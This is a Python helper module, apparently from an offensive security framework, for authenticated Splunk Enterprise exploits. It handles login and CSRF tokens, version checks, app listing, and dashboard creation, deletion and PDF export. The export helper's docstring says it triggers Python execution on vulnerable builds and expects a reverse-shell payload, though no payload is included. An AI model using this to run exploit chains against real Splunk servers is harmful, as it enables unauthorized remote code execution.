#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic Splunk Enterprise HTTP helpers for exploit and scanner modules.

Provides path helpers, login, version detection, app listing, and dashboard
CRUD/PDF-export helpers used by authenticated Splunk exploits.
"""

from __future__ import annotations

import json
import random
import re
import string
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote

from core.framework.base_module import BaseModule

_LOGIN_VERSION_RE = re.compile(r"Splunk\s+(\d+\.\d+\.\d+)")
_CSRF_COOKIE_RE = re.compile(r"^splunkweb_csrf_token_(\d+)$")
_CVAL_RE = re.compile(r"(?:^|;\s*)cval=([^;]+)")


class Splunk(BaseModule):
    """Splunk HTTP helper mixin for exploit/scanner modules."""

    @staticmethod
    def splunk_normalize_base_path(path_value: Any) -> str:
        value = str(path_value or "/").strip()
        if not value or value == "/":
            return "/"
        if not value.startswith("/"):
            value = "/" + value
        return "/" + value.strip("/")

    @classmethod
    def splunk_join_path(cls, base_path: Any, *parts: str) -> str:
        root = cls.splunk_normalize_base_path(base_path)
        clean = [p.strip("/") for p in parts if p and str(p).strip("/")]
        if not clean:
            return root
        if root == "/":
            return "/" + "/".join(clean)
        return root.rstrip("/") + "/" + "/".join(clean)

    @staticmethod
    def splunk_version_tuple(version: str) -> Tuple[int, ...]:
        parts: List[int] = []
        for token in str(version or "").split("."):
            digits = "".join(ch for ch in token if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    @classmethod
    def splunk_version_compare(cls, left: str, right: str) -> int:
        a = cls.splunk_version_tuple(left)
        b = cls.splunk_version_tuple(right)
        if a < b:
            return -1
        if a > b:
            return 1
        return 0

    @classmethod
    def splunk_version_between(cls, version: str, low: str, high: str) -> bool:
        """Inclusive range check (low <= version <= high)."""
        if not version:
            return False
        return (
            cls.splunk_version_compare(version, low) >= 0
            and cls.splunk_version_compare(version, high) <= 0
        )

    def _splunk_base(self) -> str:
        return self.splunk_normalize_base_path(getattr(self, "path", "/"))

    def splunk_login_path(self, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(root, "en-US", "account", "login")

    def splunk_home_path(self, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(root, "en-US", "app", "launcher", "home")

    def splunk_apps_local_api_path(self, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(
            root, "en-US", "splunkd", "__raw", "services", "apps", "local"
        )

    def splunk_user_page_path(self, username: str, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(
            root,
            "en-US",
            "splunkd",
            "__raw",
            "services",
            "authentication",
            "users",
            quote(str(username), safe=""),
        )

    def splunk_dashboard_create_path(self, namespace: str, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(
            root,
            "en-US",
            "splunkd",
            "__raw",
            "servicesNS",
            "admin",
            quote(str(namespace), safe=""),
            "data",
            "ui",
            "views",
        )

    def splunk_dashboard_delete_path(
        self, namespace: str, name: str, base_path: Any = None
    ) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(
            root,
            "en-US",
            "splunkd",
            "__raw",
            "servicesNS",
            "admin",
            quote(str(namespace), safe=""),
            "data",
            "ui",
            "views",
            quote(str(name), safe=""),
        )

    def splunk_pdf_export_path(self, base_path: Any = None) -> str:
        root = self.splunk_normalize_base_path(
            base_path if base_path is not None else self._splunk_base()
        )
        return self.splunk_join_path(
            root, "en-US", "splunkd", "__raw", "services", "pdfgen", "render"
        )

    def splunk_extract_csrf_token(self) -> Optional[str]:
        cookies = {}
        try:
            cookies = dict(self.session.cookies)
        except Exception:
            cookies = {}
        for name, value in cookies.items():
            if _CSRF_COOKIE_RE.match(str(name)):
                return str(value)
        return None

    def splunk_csrf_headers(self) -> Dict[str, str]:
        csrf = self.splunk_extract_csrf_token()
        headers = {"X-Requested-With": "XMLHttpRequest"}
        if csrf:
            headers["X-Splunk-Form-Key"] = csrf
        return headers

    def splunk_helper_extract_token(self, timeout: int = 20) -> bool:
        """Prime session cookies from the login page (cval + session seed)."""
        port = getattr(self, "port", None)
        try:
            port_val = int(port) if port is not None else 8000
        except (TypeError, ValueError):
            port_val = 8000

        session_id = "".join(random.choice(string.digits) for _ in range(40))
        try:
            self.session.cookies.set(f"session_id_{port_val}", session_id)
        except Exception:
            pass

        res = self.http_request(
            method="GET",
            path=self.splunk_login_path(),
            allow_redirects=True,
            timeout=timeout,
        )
        return bool(res and res.status_code == 200)

    def splunk_login(
        self,
        username: str,
        password: str,
        timeout: int = 20,
        base_path: Any = None,
    ) -> bool:
        """Authenticate to Splunk web UI. Cookies are stored on ``self.session``."""
        if base_path is not None:
            # Temporarily honor override via path attribute for join helpers.
            previous = getattr(self, "path", "/")
            try:
                self.path = self.splunk_normalize_base_path(base_path)
                return self._splunk_login_inner(username, password, timeout)
            finally:
                self.path = previous
        return self._splunk_login_inner(username, password, timeout)

    def _splunk_login_inner(self, username: str, password: str, timeout: int) -> bool:
        if not self.splunk_helper_extract_token(timeout=timeout):
            return False

        cval = None
        try:
            cval = self.session.cookies.get("cval")
        except Exception:
            cval = None
        if not cval:
            # Fallback: scan cookie jar string
            try:
                jar = "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)
                match = _CVAL_RE.search(jar)
                if match:
                    cval = match.group(1)
            except Exception:
                pass

        if not cval:
            return False

        res = self.http_request(
            method="POST",
            path=self.splunk_login_path(),
            data={
                "username": username,
                "password": password,
                "cval": cval,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
            timeout=timeout,
        )
        if not res:
            return False

        body = res.text or ""
        if res.status_code == 303:
            return True
        if res.status_code == 200 and '{"status":0}' in body.replace(" ", ""):
            return True
        # Some builds return 200 with status:0 JSON with spaces
        if res.status_code == 200 and '"status":0' in body:
            return True
        return False

    def splunk_login_version(self) -> Optional[str]:
        res = self.http_request(
            method="GET",
            path=self.splunk_login_path(),
            allow_redirects=True,
        )
        if not res:
            return None
        match = _LOGIN_VERSION_RE.search(res.text or "")
        return match.group(1) if match else None

    def splunk_home_version(self) -> Optional[str]:
        """Extract version from authenticated launcher home page JSON partials."""
        res = self.http_request(
            method="GET",
            path=self.splunk_home_path(),
            allow_redirects=True,
        )
        if not res or res.status_code != 200:
            return None

        text = res.text or ""
        # Prefer structured JSON embedded in __splunkd_partials__
        marker = "__splunkd_partials__"
        idx = text.find(marker)
        if idx >= 0:
            brace = text.find("{", idx)
            if brace >= 0:
                # Greedy brace match from first `{` after marker
                depth = 0
                end = None
                for i, ch in enumerate(text[brace:], start=brace):
                    if ch == "{":
                        depth += 1
                    elif ch == "}":
                        depth -= 1
                        if depth == 0:
                            end = i + 1
                            break
                if end:
                    try:
                        partials = json.loads(text[brace:end])
                        version = (
                            partials.get("/services/server/info", {})
                            .get("entry", [{}])[0]
                            .get("content", {})
                            .get("version")
                        )
                        if version:
                            return str(version)
                    except (json.JSONDecodeError, IndexError, TypeError, AttributeError):
                        pass

        # Fallback patterns
        match = re.search(
            r'"version"\s*:\s*"(\d+\.\d+\.\d+)"',
            text,
        )
        if match:
            return match.group(1)
        match = _LOGIN_VERSION_RE.search(text)
        return match.group(1) if match else None

    def splunk_version_authenticated(self, username: str) -> Optional[str]:
        res = self.http_request(
            method="GET",
            path=self.splunk_user_page_path(username),
            params={"output_mode": "json"},
            allow_redirects=True,
        )
        if not res or res.status_code != 200:
            return None
        try:
            body = res.json()
            version = (body or {}).get("generator", {}).get("version")
            return str(version) if version else None
        except Exception:
            return None

    def splunk_get_apps(self) -> Dict[str, Dict[str, bool]]:
        """Return ``{app_name: {enabled: bool}}`` via REST (paginated)."""
        apps: Dict[str, Dict[str, bool]] = {}
        offset = 0
        count = 100
        max_pages = 50

        for _ in range(max_pages):
            res = self.http_request(
                method="GET",
                path=self.splunk_apps_local_api_path(),
                params={
                    "output_mode": "json",
                    "count": count,
                    "offset": offset,
                },
                headers=self.splunk_csrf_headers(),
                allow_redirects=True,
            )
            if not res or res.status_code != 200:
                break
            try:
                body = res.json()
            except Exception:
                break

            entries = body.get("entry") or []
            if not entries:
                break

            for entry in entries:
                name = entry.get("name")
                if not name:
                    continue
                content = entry.get("content") or {}
                disabled = bool(content.get("disabled", False))
                apps[str(name)] = {"enabled": not disabled}

            paging = body.get("paging") or {}
            total = int(paging.get("total") or 0)
            offset += len(entries)
            if offset >= total or len(entries) < count:
                break

        return apps

    def splunk_get_random_app(self, enabled_only: bool = True) -> Optional[str]:
        apps = self.splunk_get_apps()
        names = [
            name
            for name, meta in apps.items()
            if (not enabled_only) or meta.get("enabled")
        ]
        if not names:
            return "search" if enabled_only else None
        return random.choice(names)

    def splunk_create_dashboard(
        self, namespace: str, name: str, template: str
    ) -> bool:
        csrf = self.splunk_extract_csrf_token()
        headers = self.splunk_csrf_headers()
        res = self.http_request(
            method="POST",
            path=self.splunk_dashboard_create_path(namespace),
            params={"output_mode": "json"},
            data={
                "name": name,
                "eai:data": template,
                "eai:type": "views",
            },
            headers=headers,
            allow_redirects=False,
            timeout=max(int(getattr(self, "timeout", None) or 10), 30),
        )
        if not res:
            return False
        # Splunk returns 201 Created on success
        return res.status_code in (200, 201)

    def splunk_export_dashboard(self, namespace: str, name: str) -> Optional[Any]:
        """Trigger PDF export (executes sparkline style Python on vulnerable builds).

        Returns the response, or ``None`` on transport/timeout errors (often expected
        when a reverse-shell payload blocks the worker).
        """
        csrf = self.splunk_extract_csrf_token() or ""
        timeout = max(int(getattr(self, "timeout", None) or 10), 60)
        try:
            return self.http_request(
                method="POST",
                path=self.splunk_pdf_export_path(),
                data={
                    "input-dashboard": name,
                    "namespace": namespace,
                    "splunk_form_key": csrf,
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=False,
                timeout=timeout,
            )
        except Exception:
            return None

    def splunk_delete_dashboard(self, namespace: str, name: str) -> bool:
        headers = self.splunk_csrf_headers()
        res = self.http_request(
            method="DELETE",
            path=self.splunk_dashboard_delete_path(namespace, name),
            params={"output_mode": "json"},
            headers=headers,
            allow_redirects=False,
            timeout=max(int(getattr(self, "timeout", None) or 10), 20),
        )
        return bool(res and res.status_code in (200, 204))
